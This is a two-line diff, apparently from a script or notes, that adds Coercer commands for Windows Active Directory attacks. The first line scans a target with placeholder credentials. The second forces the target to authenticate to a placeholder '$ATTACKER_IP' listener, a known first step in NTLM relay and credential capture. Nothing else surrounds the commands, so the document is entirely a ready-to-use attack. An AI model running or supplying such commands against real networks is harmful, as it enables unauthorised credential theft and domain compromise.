@@ -1,0 +1,2 @@
+coercer scan -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -t "$TARGET"
+coercer coerce -u "$USER" -p "$PASSWORD" -d "$DOMAIN" -t "$TARGET" -l "$ATTACKER_IP"
